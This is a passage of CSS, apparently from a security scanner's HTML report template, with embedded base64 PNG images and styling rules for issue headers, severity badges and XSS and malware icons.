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)
          no-repeat;
          width: 200px;
          height: 60px;
          }

          .issueInformation .xssShadow {
          background:
          url(data:image/png;base64,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)
          no-repeat;
          width: 200px;
          height: 116px;
          }

          .issueInformation .xssValue {
          position: absolute;
          left: 90px;
          top: 47px;
          color: #000000;
          font-size: 11px;
          }

          .issueInformation .xssImage {
          left: -175px;
          top: -75px;
          position: relative;
          }

          .issueInformation .malwareIcon {
          background: url(data:image/png;base64,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)
          no-repeat;
          width: 32px;
          height: 32px;
          }

          .severity {
          width: 24px;
          text-align: center;
          color: white;
          border-radius: 8px;
          -moz-border-radius: 8px;
          }

          .issueType {
          display: table;
          background-color: #3D92AC;
          margin: 64px 0 16px 0;
          width: 100%;
          height: 32px;
          border-radius: 8px;
          -moz-border-radius: 8px;
          page-break-inside: avoid;
          }

          .issueType h2 {
          font-weight: normal;
          font-size: 12pt;
          color: white;
          margin: 0;
          }

          .issueType a {
          color: white;
          text-decoration: none;
          }

          .issueType a:hover {
          color: white;
          text-decoration: underline;
          }

          .issueType div {
          display: table-cell;
          padding: 8px;
          }

          .issueType table {
          width: 99%;
          }

          .issueType td:last-child {
          height: 28px;
          text-align: right;
          }

          .issueType td {
          height: 28px;
          }

          td .severity_0,td .severity_1,td .severity_2,td .severity_3,td .severity_6 {
          height: 16px;
          float: left;
          }

          .severity_0 {
          background-color: #93A2AD;
          }

          .severity_1 {
          background-color: #FFC919;
          }

          .severity_2 {
          background-color: #FF8A00;
          }

          .severity_3 {
          background-color: #F95454;
          }

          .severity_5 {
          background-color: #009900;
          }

          .severity_6 {
          background-color: #C10C0D;
          }

          /*Issue Information*/
          .issueHeader {
          -moz-border-radius: 8px;
          border-radius: 8px;
          border: 1px solid #CCCCCC;
          margin-bottom: 16px;
          page-break-inside: avoid;
          background-color: #F7F5E4;
          background-repeat: repeat-x;
          background-image:
